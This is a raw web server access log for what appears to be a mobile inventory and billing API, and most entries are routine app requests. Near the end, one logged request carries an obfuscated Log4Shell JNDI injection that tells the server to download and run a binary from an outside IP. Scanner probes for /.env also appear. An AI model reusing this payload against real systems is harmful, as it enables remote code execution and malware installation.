::ffff:127.0.0.1 - - [14/Aug/2022:07:53:25 +0000] "GET /api/v1/transactions/user?template=62f8a8f78e470b4b6899bde0 HTTP/1.0" 200 1200 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:53:32 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:53:34 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:53:34 +0000] "GET /api/v1/transactions/user?template=62f8a8f78e470b4b6899bde0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:54:19 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 284 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:54:23 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:54:24 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:54:24 +0000] "GET /api/v1/transactions/user?template=62f8a91b8e470b4b6899be0a HTTP/1.0" 200 531 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:54:32 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:54:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1400 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:54:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:54:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:24 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:24 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 444 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:24 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 200 991 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:38 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:55:44 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/53.0.3039.90 Safari/537.32"
::1 - - [14/Aug/2022:07:55:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:55:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:01 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:56:01 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:02 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:56:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:56:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:56:30 +0000] "GET /api/v1/goods/user?barCode=X000R8BFAJ HTTP/1.0" 200 537 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:47 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:56:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:56:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:09 +0000] "POST /api/v1/templates HTTP/1.0" 200 212 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:09 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 281 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:27 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:27 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:27 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 200 1407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:57:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:57 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 200 878 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:57:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:12 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:22 +0000] "POST /api/v1/templates HTTP/1.0" 200 212 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:22 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 281 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:40 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1400 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:58:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:58:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:59:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:59:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:59:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:59:12 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:07:59:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:07:59:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:02:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:02:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:02:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:02:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:02:41 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 200 444 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:02:41 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:02:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:02:41 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 200 2283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:03:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:03:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:03:06 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 623 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:05:46 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [14/Aug/2022:08:05:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [14/Aug/2022:08:17:42 +0000] "POST /api/v1/goods HTTP/1.0" 200 352 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:26:09 +0000] "GET / HTTP/1.0" 404 139 "-" "python-requests/2.28.1"
::1 - - [14/Aug/2022:08:36:10 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [14/Aug/2022:08:44:14 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [14/Aug/2022:08:49:03 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1787 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:09 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [14/Aug/2022:08:49:14 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:17 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:17 +0000] "GET /api/v1/goods/62f8afa68e470b4b6899bf5c HTTP/1.0" 200 410 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:17 +0000] "GET /api/v1/transactions/user?good=62f8afa68e470b4b6899bf5c&sort=-createdAt HTTP/1.0" 200 119 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:24 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:46 +0000] "PUT /api/v1/goods/62f8afa68e470b4b6899bf5c HTTP/1.0" 200 352 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:53 +0000] "PUT /api/v1/goods/62f8afa68e470b4b6899bf5c HTTP/1.0" 200 352 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:49:55 +0000] "PUT /api/v1/goods/62f8afa68e470b4b6899bf5c HTTP/1.0" 200 352 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:49:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:26 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 1405 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:40 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:50 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:50 +0000] "GET /api/v1/goods/62f8a8d28e470b4b6899bdd4 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:50:50 +0000] "GET /api/v1/transactions/user?good=62f8a8d28e470b4b6899bdd4&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:50:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:07 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:07 +0000] "GET /api/v1/goods/62f8a5ab8e470b4b6899bd2b HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:07 +0000] "GET /api/v1/transactions/user?good=62f8a5ab8e470b4b6899bd2b&sort=-createdAt HTTP/1.0" 200 1118 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:11 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 200 856 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:15 +0000] "GET /api/v1/users/62f2688099e2a94b91d43777 HTTP/1.0" 200 282 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:15 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:54 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:51:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:51:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:52:00 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 286 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:52:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:52:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:52:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:52:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1787 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:52:06 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 886 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:52:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:52:56 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:26 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 457 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:33 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 287 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 1789 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:53:38 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 1150 "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:53:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:54:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:11 +0000] "GET / HTTP/1.0" 404 139 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL2xvbC9zbXRwc2VydmVyOyBjdXJsIC1PIGh0dHA6Ly8xNjguMTM4LjEyOC4xNzEvbG9sL3NtdHBzZXJ2ZXI7IGNobW9kIDc3NyBzbXRwc2VydmVyOyAuL3NtdHBzZXJ2ZXIgcnVubmVy}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL2xvbC9zbXRwc2VydmVyOyBjdXJsIC1PIGh0dHA6Ly8xNjguMTM4LjEyOC4xNzEvbG9sL3NtdHBzZXJ2ZXI7IGNobW9kIDc3NyBzbXRwc2VydmVyOyAuL3NtdHBzZXJ2ZXIgcnVubmVy}')"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:54:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:54:32 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:38 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:54:39 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:46 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [14/Aug/2022:08:54:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [14/Aug/2022:08:54:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
